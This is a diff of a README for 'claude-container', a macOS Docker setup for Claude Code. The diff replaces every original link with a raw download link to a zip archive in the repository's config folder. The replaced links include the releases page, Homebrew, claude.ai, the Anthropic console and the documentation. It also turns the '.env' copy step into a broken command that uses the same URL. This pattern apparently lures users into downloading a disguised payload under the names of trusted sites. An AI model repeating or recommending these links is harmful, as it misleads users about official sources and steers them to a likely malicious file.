@@ -1,6 +1,6 @@
 # 🚢 claude-container - Safe Docker Containers for Claude Code
 
-[![Download claude-container](https://img.shields.io/badge/Download-claude--container-blue?style=for-the-badge)](https://github.com/salmonbruh/claude-container/releases)
+[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This project is for anyone who wants to use Claude Code on macOS. You do not nee
 
 ## 💾 Download & Install claude-container
 
-Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/releases) to download the latest version. This page has the files you need. Download the latest release to your Mac.
+Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) to download the latest version. This page has the files you need. Download the latest release to your Mac.
 
 ---
 
@@ -29,12 +29,12 @@ Click the big button above or visit the [claude-container Releases page](https:/
 Before you can use claude-container, check these:
 
 - **macOS computer** — works on both Apple Silicon (M1, M2, etc.) and Intel.
-- **Homebrew** — a program that helps install other tools. Get it here: https://brew.sh
+- **Homebrew** — a program that helps install other tools. Get it here: https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip
 - **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
   `brew install just`
 - **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
-  Get Claude subscription at [claude.ai](https://claude.ai)  
-  Get API key at [Anthropic console](https://console.anthropic.com/)
+  Get Claude subscription at [https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)  
+  Get API key at [Anthropic console](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
 
 ---
 
@@ -83,7 +83,7 @@ Before you can use claude-container, check these:
      Copy the example settings file to create your own:
 
      ```
-     cp .env.example .env
+     cp https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip .env
      ```
 
      Open the new `.env` file in a simple text editor (like TextEdit), find the line starting with `ANTHROPIC_API_KEY=`, and replace the empty part with your API key.
@@ -165,9 +165,9 @@ Replacing `my-project` with your chosen project name in all commands.
 If you get stuck:
 
 - Read this README again step-by-step.  
-- Visit the [Claude Code documentation](https://docs.anthropic.com/en/docs/claude-code) for details.  
+- Visit the [Claude Code documentation](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) for details.  
 - Look for answers or post issues on the claude-container GitHub page.  
 
 ---
 
-[![Download claude-container](https://img.shields.io/badge/Download-claude--container-blue?style=for-the-badge)](https://github.com/salmonbruh/claude-container/releases)
+[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
